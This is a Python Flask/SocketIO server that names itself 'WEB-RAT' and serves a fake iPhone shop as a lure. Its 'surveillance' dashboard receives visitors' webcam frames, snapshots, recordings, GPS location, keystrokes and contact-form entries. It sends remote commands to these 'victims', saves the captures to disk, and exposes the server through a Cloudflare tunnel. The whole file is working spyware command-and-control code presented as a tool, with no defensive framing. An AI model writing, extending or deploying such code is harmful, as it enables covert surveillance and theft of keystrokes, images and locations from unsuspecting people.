import eventlet
eventlet.monkey_patch()
import os
import threading
import subprocess
import time
import re
import sys
import base64
import json
import shutil
import random
from datetime import datetime
from flask import Flask, render_template_string, request, send_from_directory, abort, jsonify
from flask_socketio import SocketIO, emit, join_room
import logging

# Suppress Flask/Werkzeug logs
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# ========== CONFIGURATION ==========
PORT = 5000
DIST_DIR = os.path.join(os.getcwd(), "dist")
CAPTURES_DIR = os.path.join(os.getcwd(), "captures")
os.makedirs(CAPTURES_DIR, exist_ok=True)

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
# Increase buffer size to 10MB to handle image frames
socketio = SocketIO(app, 
    cors_allowed_origins="*", 
    max_http_buffer_size=10 * 1024 * 1024, 
    ping_timeout=120,
    ping_interval=25,
    async_mode='eventlet',
    allow_upgrades=True
)

# Template Cache
_template_cache = {}

def load_template(filename):
    if filename not in _template_cache:
        try:
            with open(os.path.join("templates", filename), "r", encoding="utf-8") as f:
                _template_cache[filename] = f.read()
        except Exception:
            return "<h1>File Not Found: {}</h1>".format(filename)
    return _template_cache[filename]

@app.route("/")
def index():
    if os.path.exists(DIST_DIR):
        return send_from_directory(DIST_DIR, "index.html")
    products = get_products()
    return render_template_string(load_template("victim.html"), products=products, active_page='home')

@app.route("/product/<product_id>")
def product_details(product_id):
    products = get_products()
    product = next((p for p in products if p['id'] == product_id), None)
    if product:
        return render_template_string(load_template("product_details.html"), product=product, active_page='phones')
    return abort(404)

def get_products():
    products = []
    static_dir = os.path.join(os.getcwd(), 'static')
    if not os.path.exists(static_dir):
        return products
        
    for filename in os.listdir(static_dir):
        if filename.startswith('iphone-') and filename.endswith('.jpg'):
            # Parse filename: iphone-13-pro-max-256gb.jpg
            # Remove extension
            name_part = filename.rsplit('.', 1)[0]
            parts = name_part.split('-')
            
            # Extract generation for filtering/pricing
            try:
                gen_idx = parts.index('iphone') + 1
                generation = parts[gen_idx]
            except (ValueError, IndexError):
                generation = "12"

            # Formulate Display Name
            # "iphone-13-pro-max-256gb" -> "iPhone 13 Pro Max"
            # We need to separate specs from model name. 
            # Heuristic: Specs start after the model number or 'pro'/'max'
            
            model_parts = []
            spec_parts = []
            
            for part in parts:
                if part == 'iphone':
                    model_parts.append('iPhone')
                elif part in [generation, 'pro', 'max', 'mini', 'plus']:
                    model_parts.append(part.capitalize())
                else:
                    spec_parts.append(part.upper() if 'gb' in part else part.title())
            
            display_name = " ".join(model_parts)
            display_specs = " ".join(spec_parts)

            # Estimate Price
            base_prices = {
                '17': 80000, '16': 70000, '15': 60000,
                '14': 50000, '13': 40000, '12': 30000
            }
            price = base_prices.get(generation, 25000)
            
            # Premium Add-ons (+10k Pro, +10k Max)
            # Result: 17 Pro Max = 80k + 10k + 10k = 100k
            if 'Pro' in display_name: 
                price += 10000
            if 'Max' in display_name: 
                price += 10000
            
            products.append({
                'id': name_part,
                'name': display_name,
                'specs': display_specs,
                'price': f"Rs. {price:,}",
                'image': filename,
                'category': generation
            })
            
    # Sort by generation (newest first)
    products.sort(key=lambda x: x['category'], reverse=True)
    return products

@app.route("/contact")
def contact():
    return render_template_string(load_template("contact.html"))


@app.route("/surveillance")
@app.route("/dashboard")
def surveillance():
    return render_template_string(load_template("surveillance.html"), socket_url="/")

# Track connected victims: sid -> data
connected_victims = {}

@socketio.on('connect')
def handle_connect():
    client_type = request.args.get('type')
    if client_type in ['surveillance', 'dashboard']:
        join_room('surveillance')
        print(f"[*] Surveillance joined: {request.sid}")
        victims = [{'sid': sid, 'ip': data['ip']} for sid, data in connected_victims.items()]
        emit('victim_list_sync', victims)
    else:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ip and ',' in ip:
            ip = ip.split(',')[0].strip()
        connected_victims[request.sid] = {'ip': ip}
        join_room('victims')
        print(f"[*] Victim joined: {request.sid} from {ip}")
        socketio.emit('victim_connected', {'sid': request.sid, 'ip': ip}, room='surveillance')

@socketio.on('force_sync')
def handle_force_sync():
    victims = [{'sid': sid, 'ip': data['ip']} for sid, data in connected_victims.items()]
    emit('victim_list_sync', victims)

@socketio.on('disconnect')
def handle_disconnect():
    if request.sid in connected_victims:
        connected_victims.pop(request.sid, None)
        print(f"[-] Victim disconnected: {request.sid}")
        socketio.emit('victim_disconnected', {'sid': request.sid}, room='surveillance')
    else:
        print(f"[*] Control Panel disconnected: {request.sid}")

@socketio.on('video_frame')
def handle_video_frame(data):
    socketio.emit('video_frame', {'sid': request.sid, 'data': data}, room='surveillance')



@socketio.on('location_update')
def handle_location_update(data):
    print(f"[*] Location update from {request.sid[:6]}: {data.get('lat')}, {data.get('lon')}")
    socketio.emit('location_update', {'sid': request.sid, 'data': data}, room='surveillance')

@socketio.on('remote_command')
def handle_remote_command(data):
    target = data.get('target_sid')
    if target:
        socketio.emit('remote_command', data, room=target)
    else:
        socketio.emit('remote_command', data, room='victims')

@socketio.on('client_log')
def handle_client_log(msg):
    socketio.emit('log_update', {'sid': request.sid, 'msg': msg}, room='surveillance')

@socketio.on('contact_submit')
def handle_contact_submit(data):
    # Broadcast contact form submission to surveillance dashboard
    socketio.emit('contact_data', {
        'sid': request.sid,
        'name': data.get('name'),
        'email': data.get('email'),
        'message': data.get('message')
    }, room='surveillance')

@socketio.on('keystroke')
def handle_keystroke(data):
    # Broadcast keystrokes to surveillance dashboard
    socketio.emit('keystroke_update', {
        'sid': request.sid,
        'key': data.get('key'),
        'target': data.get('target')
    }, room='surveillance')

@socketio.on('surveillance_snapshot')
def handle_surveillance_snapshot(data):
    socketio.emit('surveillance_snapshot', {'sid': request.sid, 'data': data}, room='surveillance')
    try:
        val = data.get('image') if isinstance(data, dict) else data
        if val and "," in val:
            _, encoded = val.split(",", 1)
            img_data = base64.b64decode(encoded)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
            filename = f"snapshot_{request.sid[:4]}_{timestamp}_{random.randint(100, 999)}.jpg"
            filepath = os.path.join(CAPTURES_DIR, filename)
            with open(filepath, "wb") as f:
                f.write(img_data)
            mirror_capture(filepath, filename)
    except Exception as e:
        print(f"[!] Error saving snapshot: {e}")

@socketio.on('recorded_chunk')
def handle_recorded_chunk(data):
    try:
        sid = request.sid
        chunk = data.get('chunk')
        if not chunk: return
        
        # Create a unique filename for this session's recording
        # We use a timestamp that doesn't change for the duration of one recording session
        # The client should send a 'recording_id' ideally, but for now we can append to a file
        # based on the current minute or just append to a growing file.
        # Better approach: Client sends "recording_id" with every chunk.
        
        rec_id = data.get('rec_id', 'unknown')
        filename = f"recording_{sid[:4]}_{rec_id}.webm"
        filepath = os.path.join(CAPTURES_DIR, filename)
        
        with open(filepath, "ab") as f:
            f.write(chunk)
            
        # Optional: Mirror to Desktop/SD card if finalized? 
        # Real-time writing is better for stream dumping.
    except Exception as e:
        print(f"[!] Error saving recording chunk: {e}")

def mirror_capture(src_path, filename):
    try:
        dest_dir = None
        if os.name == 'nt':
            dest_dir = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'WebRat_Captures')
        elif os.path.exists("/sdcard"):
            dest_dir = "/sdcard/Download/WebRat_Captures"
        
        if dest_dir:
            os.makedirs(dest_dir, exist_ok=True)
            shutil.copy2(src_path, os.path.join(dest_dir, filename))
            return True
    except Exception:
        pass
    return False

@app.route('/captures/<path:filename>')
def download_file(filename):
    return send_from_directory(CAPTURES_DIR, filename)

@app.route('/<path:filename>')
def serve_static(filename):
    # Security: Prevent access to source files
    if filename.endswith(('.py', '.pyc', '.git', '.env')):
        abort(403)
        
    # Check in dist folder first (for React build)
    if os.path.exists(os.path.join(DIST_DIR, filename)):
        return send_from_directory(DIST_DIR, filename)
        
    return send_from_directory('.', filename)

@app.errorhandler(404)
def not_found(e):
    if os.path.exists(DIST_DIR):
        return send_from_directory(DIST_DIR, "index.html")
    return "Not Found", 404

@app.route('/api/captures')
def list_captures():
    files = []
    if os.path.exists(CAPTURES_DIR):
        for f in os.listdir(CAPTURES_DIR):
            path = os.path.join(CAPTURES_DIR, f)
            if os.path.isfile(path):
                files.append({
                    "name": f,
                    "url": f"/captures/{f}",
                    "time": os.path.getmtime(path)
                })
        files.sort(key=lambda x: x['time'], reverse=True)
    return jsonify(files)

def kill_port(port):
    try:
        if os.name == 'nt':
            cmd = f'netstat -ano | findstr :{port}'
            pids = set()
            with os.popen(cmd) as f:
                for line in f:
                    if "LISTENING" in line:
                        parts = line.split()
                        if parts: pids.add(parts[-1])
            for pid in pids:
                if pid != "0":
                    subprocess.run(['taskkill', '/F', '/T', '/PID', pid], capture_output=True)
        else:
            subprocess.run(['fuser', '-k', f'{port}/tcp'], capture_output=True)
    except Exception:
        pass

def start_cloudflared_tunnel():
    if os.name == 'nt':
        subprocess.run(['taskkill', '/F', '/IM', 'cloudflared.exe', '/T'], capture_output=True)
    else:
        os.system("pkill -9 cloudflared > /dev/null 2>&1")
    
    time.sleep(1)
    
    # Clear old tunnel URL
    if os.path.exists(".tunnel_url"):
        try: os.remove(".tunnel_url")
        except: pass

    cf_binary = "cloudflared"
    if os.name == 'nt':
        paths = [
            r"C:\Program Files (x86)\cloudflared\cloudflared.exe",
            r"C:\Program Files\cloudflared\cloudflared.exe",
            os.path.join(os.getcwd(), "cloudflared.exe")
        ]
        for p in paths:
            if os.path.exists(p):
                cf_binary = f'"{p}"'
                break

    def launch():
        cmd = f"{cf_binary} tunnel --url http://localhost:{PORT}"
        try:
            proc = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, text=True, bufsize=1)
            app.tunnels.append(proc)
            for line in iter(proc.stderr.readline, ''):
                if "trycloudflare.com" in line:
                    match = re.search(r'https://[-a-zA-Z0-9]+\.trycloudflare\.com', line)
                    if match:
                        url = match.group(0)
                        # Save URL for server.ts to read
                        try:
                            with open(".tunnel_url", "w") as f:
                                f.write(url)
                        except: pass
                        
                        print("\n" + "="*60)
                        print(f" SYSTEM ONLINE: {url}")
                        print(f" SURVEILLANCE:  {url}/surveillance")
                        print("="*60 + "\n")
                        break
        except Exception:
            pass

    threading.Thread(target=launch, daemon=True).start()

def main():
    print("[*] Initializing WEB-RAT System...")
    kill_port(PORT)
    app.tunnels = []
    start_cloudflared_tunnel()
    
    try:
        # Use log_output=False to silence SocketIO server messages
        socketio.run(app, host="0.0.0.0", port=PORT, debug=False, log_output=False)
    except KeyboardInterrupt:
        print("\n[!] Stopping server...")
    finally:
        for proc in getattr(app, 'tunnels', []):
            if proc:
                proc.terminate()
                try: proc.wait(timeout=2)
                except: proc.kill()

if __name__ == "__main__":
    main()
